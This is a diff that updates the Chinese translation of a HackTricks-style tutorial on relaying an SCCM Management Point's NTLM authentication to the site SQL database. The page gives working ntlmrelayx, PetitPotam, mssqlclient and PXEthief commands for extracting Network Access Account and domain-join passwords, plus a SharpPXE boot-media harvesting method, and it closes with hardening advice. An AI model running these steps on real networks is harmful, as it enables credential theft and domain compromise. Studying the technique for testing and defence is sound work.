@@ -1,39 +1,41 @@
-# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction
+# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret 提取
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-通过强制 **System Center Configuration Manager (SCCM) Management Point (MP)** 在 SMB/RPC 上进行身份验证，并将该 NTLM 机器帐户**中继(relay)** 到 **site database (MSSQL)**，你可以获得 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 权限。 这些角色允许你调用一组存储过程，导出 **Operating System Deployment (OSD)** 策略 blob（Network Access Account 凭据、Task-Sequence 变量等）。 这些 blob 是十六进制编码/加密的，但可以使用 **PXEthief** 解码并解密，得到明文密钥。
+通过强制 **System Center Configuration Manager (SCCM) Management Point (MP)** 通过 SMB/RPC 进行认证，并将该 NTLM machine account **relay** 到 **site database (MSSQL)**，即可获得 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 权限。这些角色允许你调用一组 stored procedures，从而暴露 **Operating System Deployment (OSD)** policy blobs（Network Access Account credentials、Task-Sequence variables 等）。这些 blobs 经过十六进制编码/加密，但可以使用 **PXEthief** 进行解码和解密，从而获得明文 secrets。
 
-高层步骤：
-1. 发现 MP 与站点 DB ↦ 未经身份验证的 HTTP 端点 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
+High-level chain:
+1. 发现 MP 和 site DB ↦ 未认证 HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
 2. 启动 `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`。
-3. 使用 **PetitPotam**, PrinterBug, DFSCoerce 等强制 MP 进行认证。
-4. 通过 SOCKS 代理以被中继的 **<DOMAIN>\\<MP-host>$** 帐户使用 `mssqlclient.py -windows-auth` 连接。
+3. 使用 **PetitPotam**、PrinterBug、DFSCoerce 等工具强制 MP 进行认证。
+4. 通过 SOCKS proxy 使用 `mssqlclient.py -windows-auth`，以被 relay 的 **<DOMAIN>\\<MP-host>$** account 身份连接。
 5. 执行：
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
-* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (或 `MP_GetPolicyBodyAfterAuthorization`)
-6. 去掉 `0xFFFE` BOM，`xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。
+* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`  （或 `MP_GetPolicyBodyAfterAuthorization`）
+6. 移除 `0xFFFE` BOM，使用 `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`。
 
-诸如 `OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` 等密钥可在不触及 PXE 或客户端的情况下被恢复。
+无需接触 PXE 或 clients，即可恢复 `OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` 等 secrets。<sup>[[1]](#references)[[3]](#references)</sup>
 
 ---
 
-## 1. 枚举无需认证的 MP 端点
-MP 的 ISAPI 扩展 **GetAuth.dll** 暴露了几个不需要认证的参数（除非站点仅使用 PKI）：
+## 1. 枚举未认证的 MP endpoints
+MP ISAPI extension **GetAuth.dll** 暴露了多个不要求 authentication 的 parameters（除非 site 仅使用 PKI）：<sup>[[1]](#references)</sup>
 
-| 参数 | 目的 |
+| Parameter | Purpose |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | 返回站点签名证书的公钥 + *x86* / *x64* **All Unknown Computers** 设备的 GUID。 |
-| `MPLIST` | 列出站点中的每个 Management-Point。 |
-| `SITESIGNCERT` | 返回 Primary-Site 签名证书（无需 LDAP 即可识别站点服务器）。 |
+| `MPKEYINFORMATIONMEDIA` | 返回 site signing cert public key，以及 *x86* / *x64* **All Unknown Computers** devices 的 GUIDs。 |
+| `MPLIST` | 列出 site 中的所有 Management-Point。 |
+| `SITESIGNCERT` | 返回 Primary-Site signing certificate（无需 LDAP 即可识别 site server）。 |
 
-抓取将作为后续 DB 查询 **clientID** 的 GUID：
+获取稍后 DB queries 将使用的 GUIDs，并将其作为 **clientID**：
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
-## 2. 将 MP 计算机账户 Relay 到 MSSQL
+---
+
+## 2. 将 MP machine account Relay 到 MSSQL
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -42,21 +44,21 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-当 coercion 触发时，你应该会看到类似如下：
+当 coercion 触发时，你应该会看到类似这样的内容：
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
 ```
 ---
 
-## 3. 通过存储过程识别 OSD 策略
-通过 SOCKS 代理连接（默认端口 1080）：
+## 3. 通过存储过程识别 OSD policies
+通过 SOCKS proxy 连接（默认端口为 1080）：<sup>[[1]](#references)</sup>
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-切换到 **CM_<SiteCode>** DB（使用三位站点代码，例如 `CM_001`）。
+切换到 **CM_<SiteCode>** DB（使用 3 位站点代码，例如 `CM_001`）。
 
-### 3.1  查找 Unknown-Computer GUIDs（可选）
+### 3.1 查找 Unknown-Computer GUID（可选）
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
@@ -67,19 +69,19 @@ WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-每行包含 `PolicyAssignmentID`、`Body`（hex）、`PolicyID`、`PolicyVersion`。
+每一行包含 `PolicyAssignmentID`、`Body`（hex）、`PolicyID`、`PolicyVersion`。
 
-重点关注以下策略：
+重点关注以下 policies：
 * **NAAConfig**  – Network Access Account 凭据
 * **TS_Sequence** – Task Sequence 变量（OSDJoinAccount/Password）
-* **CollectionSettings** – 可能包含 run-as 账户
+* **CollectionSettings** – 可能包含 run-as accounts
 
-### 3.3  检索完整 `Body`
-如果您已经拥有 `PolicyID` 和 `PolicyVersion`，可以使用以下方法跳过 clientID 要求：
+### 3.3  获取完整 body
+如果你已经拥有 `PolicyID` 和 `PolicyVersion`，可以使用以下方式跳过 clientID 要求：
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> 重要：在 SSMS 中将 “Maximum Characters Retrieved” 提高到 (>65535)，否则 blob 将被截断。
+> 重要：在 SSMS 中增加“Maximum Characters Retrieved”（>65535），否则 blob 将被截断。
 
 ---
 
@@ -91,7 +93,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-恢复的机密示例：
+已恢复的 secrets 示例：
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -100,18 +102,18 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. 相关的 SQL 角色和存储过程
-在中继后，登录被映射为：
+## 5. 相关 SQL roles & procedures
+relay 后，登录会映射到：<sup>[[1]](#references)</sup>
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-这些角色暴露了数十个 EXEC 权限，本次攻击中使用的关键权限有：
+这些 roles 暴露了几十个 EXEC 权限，本次攻击中使用的关键权限如下：
 
-| 存储过程 | 用途 |
+| Stored Procedure | 用途 |
 |------------------|---------|
-| `MP_GetMachinePolicyAssignments` | 列出应用于 `clientID` 的策略。 |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 返回完整的策略主体。 |
-| `MP_GetListOfMPsInSiteOSD` | 由 `MPKEYINFORMATIONMEDIA` 路径返回。 |
+| `MP_GetMachinePolicyAssignments` | 列出应用于 `clientID` 的 policies。 |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 返回完整的 policy body。 |
+| `MP_GetListOfMPsInSiteOSD` | 由 `MPKEYINFORMATIONMEDIA` path 返回。 |
 
 你可以使用以下命令检查完整列表：
 ```sql
@@ -124,44 +126,44 @@ AND  pe.permission_name='EXECUTE';
 ```
 ---
 
-## 6. PXE 引导媒体采集 (SharpPXE)
-* **PXE reply over UDP/4011**: 向配置为 PXE 的 Distribution Point 发送 PXE 引导请求。proxyDHCP 响应会泄露引导路径，例如 `SMSBoot\\x64\\pxe\\variables.dat`（加密的配置）和 `SMSBoot\\x64\\pxe\\boot.bcd`，以及可选的加密密钥 blob。
-* **Retrieve boot artifacts via TFTP**: 使用返回的路径通过 TFTP（无认证）下载 `variables.dat`。该文件很小（几 KB），包含加密的媒体变量。
-* **Decrypt or crack**:
-- 如果响应包含解密密钥，将其提供给 **SharpPXE** 以直接解密 `variables.dat`。
-- 如果未提供密钥（PXE 媒体受自定义密码保护），SharpPXE 会生成一个 **Hashcat-compatible** `$sccm$aes128$...` 哈希用于离线破解。恢复密码后再解密该文件。
-* **Parse decrypted XML**: 明文变量包含 SCCM 部署元数据（**Management Point URL**、**Site Code**、媒体 GUID 及其他标识）。SharpPXE 会解析这些内容并打印一个可直接运行的 **SharpSCCM** 命令，预填充 GUID/PFX/site 参数以便后续滥用。
-* **Requirements**: 只需对 PXE 监听器（UDP/4011）和 TFTP 的网络可达性；不需要本地管理员权限。
+## 6. PXE boot media harvesting (SharpPXE)
+* **PXE reply over UDP/4011**：向配置为 PXE 的 Distribution Point 发送 PXE boot request。proxyDHCP response 会透露 boot paths，例如 `SMSBoot\\x64\\pxe\\variables.dat`（encrypted config）和 `SMSBoot\\x64\\pxe\\boot.bcd`，以及可选的 encrypted key blob。<sup>[[4]](#references)</sup>
+* **Retrieve boot artifacts via TFTP**：使用返回的 paths 通过 TFTP 下载 `variables.dat`（unauthenticated）。该文件很小（几 KB），包含 encrypted media variables。
+* **Decrypt or crack**：
+- 如果 response 包含 decryption key，将其提供给 **SharpPXE**，直接 decrypt `variables.dat`。
+- 如果未提供 key（PXE media 受 custom password 保护），SharpPXE 会输出兼容 **Hashcat** 的 `$sccm$aes128$...` hash，用于 offline cracking。恢复 password 后，decrypt 该文件。
+* **Parse decrypted XML**：plaintext variables 包含 SCCM deployment metadata（**Management Point URL**、**Site Code**、media GUIDs 及其他 identifiers）。SharpPXE 会解析这些内容，并打印一条可直接运行的 **SharpSCCM** command，其中已预填 GUID/PFX/site parameters，供后续 abuse 使用。
+* **Requirements**：只需要能够访问 PXE listener（UDP/4011）和 TFTP；不需要 local admin privileges。
 
 ---
 
-## 7. 检测与加固
-1. **Monitor MP logins** – 监控 MP 登录：任何 MP 计算机帐户从非其宿主的 IP 登录都可能表示中继行为。
-2. 在站点数据库上启用 **Extended Protection for Authentication (EPA)**（`PREVENT-14`）。
-3. 禁用未使用的 NTLM，强制 SMB signing，限制 RPC（与针对 `PetitPotam`/`PrinterBug` 的缓解措施相同）。
-4. 使用 IPSec / mutual-TLS 加固 MP ↔ DB 通信。
-5. **Constrain PXE exposure** – 对 UDP/4011 和 TFTP 在受信任 VLAN 上设防火墙，要求 PXE 密码，并在检测到 TFTP 下载 `SMSBoot\\*\\pxe\\variables.dat` 时触发告警。
+## 7. Detection & Hardening
+1. **Monitor MP logins** – 任何从非其主机 IP 登录的 MP computer account，均可能表示 relay。<sup>[[1]](#references)</sup>
+2. 在 site database 上启用 **Extended Protection for Authentication (EPA)**（`PREVENT-14`）。
+3. 禁用未使用的 NTLM，强制启用 SMB signing，限制 RPC（
+与针对 `PetitPotam`/`PrinterBug` 使用的 mitigations 相同）。
+4. 使用 IPSec / mutual-TLS 强化 MP ↔ DB communication。
+5. **Constrain PXE exposure** – 将 UDP/4011 和 TFTP 限制在受信任的 VLAN；要求 PXE passwords，并针对 `SMSBoot\\*\\pxe\\variables.dat` 的 TFTP downloads 触发 alert。<sup>[[4]](#references)</sup>
 
 ---
 
 ## See also
-* NTLM relay fundamentals:
+* NTLM relay fundamentals：
 
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
-* MSSQL abuse & post-exploitation:
+* MSSQL abuse & post-exploitation：
 
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-
-
 ## References
-- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
-- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
-- [SharpPXE](https://github.com/leftp/SharpPXE)
+- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
+- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [4] [SharpPXE](https://github.com/leftp/SharpPXE)
+
 {{#include ../../banners/hacktricks-training.md}}
